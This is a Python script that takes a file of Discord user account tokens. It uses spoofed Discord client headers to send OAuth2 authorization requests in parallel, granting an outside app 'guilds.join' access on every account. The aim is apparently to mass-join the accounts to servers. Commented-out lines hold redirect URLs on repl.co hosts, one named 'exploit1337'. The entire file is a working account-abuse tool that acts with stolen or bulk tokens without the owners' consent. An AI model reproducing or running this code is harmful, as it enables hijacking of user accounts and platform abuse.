# auth_url = "https://discord.com/api/oauth2/authorize?client_id=1077202928529580062&redirect_uri=https://oauth2-uwu-2.exploit1337.repl.co&response_type=code&scope=identify%20guilds.join"
# auth_url = "https://discord.com/api/oauth2/authorize?client_id=1088101727170998273&redirect_uri=https%3A%2F%2Fmaybe-oauth2.notexploit1337.repl.co&response_type=code&scope=identify%20guilds.join"

auth_url = input("[!] Enter auth url: ")
# auth_url = "https://discord.com/api/v9/oauth2/authorize?client_id=1093411913121140736&redirect_uri=https%3A%2F%2FAstronomicals-members.vloneswork.repl.co&response_type=code&scope=identify%20guilds.join"

import requests, threading, time, ctypes

count = 0 

def title():
  ctypes.windll.kernel32.SetConsoleTitleW("Authorized: %s" % count)

def get_headers(tk):
    headers = {
                "accept": "*/*",
                # "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "authorization": tk,
                "referer": "https://discord.com/channels/@me",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "en-US",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    }
    return headers


def authorize(token):
  global count
  while True:
    try:
      headers = get_headers(token)
      r = requests.post(auth_url, headers=headers, json={"authorize": "true"})
      # print(r.text)
      if r.status_code in (200, 201, 204):
        if 'location' in r.text:
          location = r.json()['location']
          requests.get(location)
          print(count, "[INFO]: Successfully Authorized:", token)
          count += 1
          title()

          break
        else:
          print("[ERROR]: Failed to Authorize:", token, r.text)
          break
      else:
        print("[ERROR]: Failed to Authorize:", token, r.text)
        break
    except Exception as e:
      print("[ERROR]: Failed to Authorize:", token, e)
      if "connection" in str(e):
        time.sleep(0.5)
        continue
      else:
        break
      # return

_f = open("tokens.txt", "r").readlines()

for _tk in _f:
  _tk = _tk.strip()
  # _tk = _tk.split(":")[2]
  time.sleep(0.1)
  threading.Thread(target=authorize, args=(_tk,)).start()